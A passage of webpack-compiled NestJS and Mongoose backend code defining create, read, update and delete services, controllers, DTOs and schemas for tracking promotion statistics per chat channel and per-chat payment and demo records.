    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let PromoteMsgsService = class PromoteMsgsService {
    constructor(promotemsgModel) {
        this.promotemsgModel = promotemsgModel;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.promotemsgModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return updatedUser;
    }
};
exports.PromoteMsgsService = PromoteMsgsService;
exports.PromoteMsgsService = PromoteMsgsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('promotemsgModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], PromoteMsgsService);


/***/ }),

/***/ "./src/components/promote-stats/dto/create-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/create-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreatePromoteStatDto {
}
exports.CreatePromoteStatDto = CreatePromoteStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    __metadata("design:type", String)
], CreatePromoteStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    __metadata("design:type", Map)
], CreatePromoteStatDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719860106247.0, description: 'Last Updated TimeStamp' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    __metadata("design:type", Boolean)
], CreatePromoteStatDto.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    __metadata("design:type", Array)
], CreatePromoteStatDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-stats/dto/update-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/update-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
class UpdatePromoteStatDto extends (0, swagger_1.PartialType)(create_promote_stat_dto_1.CreatePromoteStatDto) {
}
exports.UpdatePromoteStatDto = UpdatePromoteStatDto;


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.controller.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.controller.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./dto/create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
const update_promote_stat_dto_1 = __webpack_require__(/*! ./dto/update-promote-stat.dto */ "./src/components/promote-stats/dto/update-promote-stat.dto.ts");
let PromoteStatController = class PromoteStatController {
    constructor(promoteStatService) {
        this.promoteStatService = promoteStatService;
    }
    async create(createPromoteStatDto) {
        return this.promoteStatService.create(createPromoteStatDto);
    }
    async findByClient(client) {
        return this.promoteStatService.findByClient(client);
    }
    async update(client, updatePromoteStatDto) {
        return this.promoteStatService.update(client, updatePromoteStatDto);
    }
    async deleteOne(client) {
        return this.promoteStatService.deleteOne(client);
    }
    async deleteAll() {
        return this.promoteStatService.deleteAll();
    }
};
exports.PromoteStatController = PromoteStatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_stat_dto_1.CreatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "findByClient", null);
__decorate([
    (0, common_1.Put)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_stat_dto_1.UpdatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteAll", null);
exports.PromoteStatController = PromoteStatController = __decorate([
    (0, swagger_1.ApiTags)('promote-stats'),
    (0, common_1.Controller)('promote-stats'),
    __metadata("design:paramtypes", [promote_stat_service_1.PromoteStatService])
], PromoteStatController);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.module.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.module.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatModule = void 0;
const init_module_1 = __webpack_require__(/*! ./../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const promote_stat_controller_1 = __webpack_require__(/*! ./promote-stat.controller */ "./src/components/promote-stats/promote-stat.controller.ts");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let PromoteStatModule = class PromoteStatModule {
};
exports.PromoteStatModule = PromoteStatModule;
exports.PromoteStatModule = PromoteStatModule = __decorate([
    (0, common_1.Module)({
        imports: [init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: promote_stat_schema_1.PromoteStat.name, collection: "promoteStats", schema: promote_stat_schema_1.PromoteStatSchema }]),
            client_module_1.ClientModule
        ],
        controllers: [promote_stat_controller_1.PromoteStatController],
        providers: [promote_stat_service_1.PromoteStatService],
        exports: [promote_stat_service_1.PromoteStatService]
    })
], PromoteStatModule);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.service.ts":
/*!**************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.service.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let PromoteStatService = class PromoteStatService {
    constructor(promoteStatModel, clientService) {
        this.promoteStatModel = promoteStatModel;
        this.clientService = clientService;
    }
    async create(createPromoteStatDto) {
        const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);
        return createdPromoteStat.save();
    }
    async findAll() {
        const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();
        return promoteStat;
    }
    async findByClient(client) {
        const promoteStat = await this.promoteStatModel.findOne({ client }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async update(client, updatePromoteStatDto) {
        const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async deleteOne(client) {
        const result = await this.promoteStatModel.deleteOne({ client }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
    }
    async deleteAll() {
        await this.promoteStatModel.deleteMany({}).exec();
    }
    async reinitPromoteStats() {
        const users = await this.findAll();
        for (const user of users) {
            await this.promoteStatModel.updateOne({ client: user.client }, {
                $set: {
                    totalCount: 0,
                    uniqueChannels: 0,
                    releaseDay: Date.now(),
                    lastUpdatedTimeStamp: Date.now(),
                    data: {}
                }
            });
        }
    }
};
exports.PromoteStatService = PromoteStatService;
exports.PromoteStatService = PromoteStatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_stat_schema_1.PromoteStat.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], PromoteStatService);


/***/ }),

/***/ "./src/components/promote-stats/schemas/promote-stat.schema.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/schemas/promote-stat.schema.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatSchema = exports.PromoteStat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let PromoteStat = class PromoteStat {
};
exports.PromoteStat = PromoteStat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteStat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    (0, mongoose_1.Prop)({ required: true, type: Map, of: Number }),
    __metadata("design:type", Map)
], PromoteStat.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], PromoteStat.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Last Updated TimeStamp' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    (0, mongoose_1.Prop)({ required: true, type: [String] }),
    __metadata("design:type", Array)
], PromoteStat.prototype, "channels", void 0);
exports.PromoteStat = PromoteStat = __decorate([
    (0, mongoose_1.Schema)()
], PromoteStat);
exports.PromoteStatSchema = mongoose_1.SchemaFactory.createForClass(PromoteStat);


/***/ }),

/***/ "./src/components/stats2/create-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/create-stat2.dto.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats2/stat2.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/stat2.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Controller = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
const update_stat2_dto_1 = __webpack_require__(/*! ./update-stat2.dto */ "./src/components/stats2/update-stat2.dto.ts");
let Stat2Controller = class Stat2Controller {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.Stat2Controller = Stat2Controller;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat2_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat2_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteAll", null);
exports.Stat2Controller = Stat2Controller = __decorate([
    (0, swagger_1.ApiTags)('stats2'),
    (0, common_1.Controller)('stats2'),
    __metadata("design:paramtypes", [stat2_service_1.Stat2Service])
], Stat2Controller);


/***/ }),

/***/ "./src/components/stats2/stat2.module.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Module = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const stat2_controller_1 = __webpack_require__(/*! ./stat2.controller */ "./src/components/stats2/stat2.controller.ts");
const stat2_schema_1 = __webpack_require__(/*! ./stat2.schema */ "./src/components/stats2/stat2.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let Stat2Module = class Stat2Module {
};
exports.Stat2Module = Stat2Module;
exports.Stat2Module = Stat2Module = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: "Stats2Module", collection: "stats2", schema: stat2_schema_1.StatSchema }])
        ],
        controllers: [stat2_controller_1.Stat2Controller],
        providers: [stat2_service_1.Stat2Service],
        exports: [stat2_service_1.Stat2Service]
    })
], Stat2Module);


/***/ }),

/***/ "./src/components/stats2/stat2.schema.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.schema.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat2 = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat2 = class Stat2 {
};
exports.Stat2 = Stat2;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "profile", void 0);
exports.Stat2 = Stat2 = __decorate([
    (0, mongoose_1.Schema)()
], Stat2);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat2);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats2/stat2.service.ts":
/*!************************************************!*\
  !*** ./src/components/stats2/stat2.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


